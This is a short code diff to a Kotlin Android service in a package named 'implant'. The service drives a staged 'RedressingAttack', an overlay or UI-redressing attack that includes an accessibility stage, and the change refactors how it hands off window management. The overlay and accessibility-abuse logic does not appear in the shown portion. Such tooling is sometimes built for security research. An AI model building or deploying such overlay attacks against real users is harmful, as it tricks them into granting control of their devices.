@@ -6,18 +6,13 @@
 package com.cooperthecoder.implant
 
 import android.app.Service
-import android.content.Context
 import android.content.Intent
 import android.os.IBinder
 import android.util.Log
-import android.view.WindowManager
 
 
 class OverlayService : Service(), RedressingAttack.Listener {
 
-    private val windowManager: WindowManager by lazy {
-        getSystemService(Context.WINDOW_SERVICE) as WindowManager
-    }
     private lateinit var attack: RedressingAttack
 
     companion object {
@@ -32,25 +27,25 @@ class OverlayService : Service(), RedressingAttack.Listener {
     override fun onCreate() {
         super.onCreate()
         val stages = ArrayList<Stage>()
-        stages.add(AccessiblityStage(this))
+        stages.add(AccessiblityStage(this, this))
         attack = RedressingAttack(stages)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        attack.moveToNext(this, windowManager)
+        attack.moveToNext()
         return START_STICKY
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        attack.stopAttack(this, windowManager)
+        attack.stopAttack()
     }
 
     override fun onAttackDone() {
         Log.d(TAG, "Stage completed")
         // Go to the home screen if there are no more stages
-        if (!attack.moveToNext(this, windowManager)) {
-            attack.stopAttack(this, windowManager)
+        if (!attack.moveToNext()) {
+            attack.stopAttack()
             stopSelf()
             val intent = Intent(Intent.ACTION_MAIN)
             intent.addCategory(Intent.CATEGORY_HOME)
